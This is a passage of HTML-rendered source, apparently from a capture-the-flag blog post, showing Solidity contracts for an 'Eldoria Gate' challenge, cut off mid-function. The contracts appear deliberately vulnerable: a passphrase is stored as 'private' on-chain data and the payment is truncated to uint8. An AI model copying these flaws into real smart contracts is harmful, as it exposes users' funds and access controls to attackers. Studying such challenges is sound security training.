+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     Through strict trials, and offerings made,
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     Eldoria&#39;s glory, is thus displayed.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">                   ELDORIA GATES
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">             *_   _   _   _   _   _ *
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     ^       | `_&#39; `-&#39; `_&#39; `-&#39; `_&#39; `|       ^
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     |       |                      |       |
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     |  (*)  |     .___________     |  \^/  |
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     | _&lt;#&gt;_ |    //           \    | _(#)_ |
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">    o+o \ / \0    ||   =====   ||   0/ \ / (=)
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">     0&#39;\ ^ /\/    ||           ||   \/\ ^ /`0
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">       /_^_\ |    ||    ---    ||   | /_^_\
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">       || || |    ||           ||   | || ||
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">       d|_|b_T____||___________||___T_d|_|b
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">  
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">***/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> { EldoriaGateKernel } <span style="color:#e67e80">from</span> <span style="color:#b2c98f">&#34;./EldoriaGateKernel.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> EldoriaGate {
+</span></span><span style="display:flex;"><span>    EldoriaGateKernel <span style="color:#e67e80">public</span> kernel;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> VillagerEntered(<span style="color:#dbbc7f">address</span> villager, <span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">bool</span> authenticated, <span style="color:#dbbc7f">string</span>[] roles);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">event</span> UsurperDetected(<span style="color:#dbbc7f">address</span> villager, <span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">string</span> alertMessage);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">struct</span> Villager {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> id;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bool</span> authenticated;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> roles;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret) {
+</span></span><span style="display:flex;"><span>        kernel <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> EldoriaGateKernel(_secret);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">enter</span>(<span style="color:#dbbc7f">bytes4</span> passphrase) <span style="color:#e67e80">external</span> <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bool</span> isAuthenticated <span style="color:#7a8478">=</span> kernel.authenticate(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, passphrase);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(isAuthenticated, <span style="color:#b2c98f">&#34;Authentication failed&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> contribution <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);        
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">uint</span> villagerId, <span style="color:#dbbc7f">uint8</span> assignedRolesBitMask) <span style="color:#7a8478">=</span> kernel.evaluateIdentity(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, contribution);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span> roles <span style="color:#7a8478">=</span> getVillagerRoles(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        emit VillagerEntered(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, villagerId, isAuthenticated, roles);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">getVillagerRoles</span>(<span style="color:#dbbc7f">address</span> _villager) <span style="color:#e67e80">public</span> <span style="color:#e67e80">view</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span>[<span style="color:#d699b6">8</span>] <span style="color:#e67e80">memory</span> roleNames <span style="color:#7a8478">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;SERF&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;PEASANT&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;ARTISAN&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;MERCHANT&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;KNIGHT&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;BARON&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;EARL&#34;</span>, 
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;DUKE&#34;</span>
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        (, , <span style="color:#dbbc7f">uint8</span> rolesBitMask) <span style="color:#7a8478">=</span> kernel.villagers(_villager);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> count <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">8</span>; i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#e67e80">if</span> ((rolesBitMask <span style="color:#7a8478">&amp;</span> (<span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> i)) <span style="color:#7a8478">!=</span> <span style="color:#d699b6">0</span>) {
+</span></span><span style="display:flex;"><span>                count<span style="color:#7a8478">++</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">string</span>[] <span style="color:#e67e80">memory</span> foundRoles <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> <span style="color:#dbbc7f">string</span>[](count);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> index <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">uint8</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">8</span>; i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#dbbc7f">uint8</span> roleBit <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">1</span>) <span style="color:#7a8478">&lt;&lt;</span> i; 
+</span></span><span style="display:flex;"><span>            <span style="color:#e67e80">if</span> (kernel.hasRole(_villager, roleBit)) {
+</span></span><span style="display:flex;"><span>                foundRoles[index] <span style="color:#7a8478">=</span> roleNames[i];
+</span></span><span style="display:flex;"><span>                index<span style="color:#7a8478">++</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> foundRoles;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">checkUsurper</span>(<span style="color:#dbbc7f">address</span> _villager) <span style="color:#e67e80">external</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>        (<span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">bool</span> authenticated , <span style="color:#dbbc7f">uint8</span> rolesBitMask) <span style="color:#7a8478">=</span> kernel.villagers(_villager);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bool</span> isUsurper <span style="color:#7a8478">=</span> authenticated <span style="color:#7a8478">&amp;&amp;</span> (rolesBitMask <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span>);
+</span></span><span style="display:flex;"><span>        emit UsurperDetected(
+</span></span><span style="display:flex;"><span>            _villager,
+</span></span><span style="display:flex;"><span>            id,
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">&#34;Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach.&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> isUsurper;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<br>
+<details>
+  <summary style="color: #F99417; cursor: pointer">EldoriaGateKernel.sol</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">90
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">28</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> EldoriaGateKernel {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes4</span> <span style="color:#e67e80">private</span> eldoriaSecret;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> Villager) <span style="color:#e67e80">public</span> villagers;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> frontend;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_SERF     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_PEASANT  <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_ARTISAN  <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_MERCHANT <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_KNIGHT   <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">4</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_BARON    <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">5</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_EARL     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">6</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_DUKE     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">7</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">struct</span> Villager {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> id;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bool</span> authenticated;
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> roles;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret) {
+</span></span><span style="display:flex;"><span>        eldoriaSecret <span style="color:#7a8478">=</span> _secret;
+</span></span><span style="display:flex;"><span>        frontend <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">modifier</span> <span style="color:#b2c98f">onlyFrontend</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>            if <span style="color:#b2c98f">iszero</span>(<span style="color:#b2c98f">eq</span>(<span style="color:#b2c98f">caller</span>(), <span style="color:#b2c98f">sload</span>(frontend.slot))) {
+</span></span><span style="display:flex;"><span>                <span style="color:#b2c98f">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>)
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">authenticate</span>(<span style="color:#dbbc7f">address</span> _unknown, <span style="color:#dbbc7f">bytes4</span> _passphrase) <span style="color:#e67e80">external</span> onlyFrontend <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> auth) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#7a8478">let</span> secret <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(eldoriaSecret.slot)            
+</span></span><span style="display:flex;"><span>            auth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">eq</span>(shr(<span style="color:#d699b6">224</span>, _passphrase), secret)
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x80</span>, auth)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
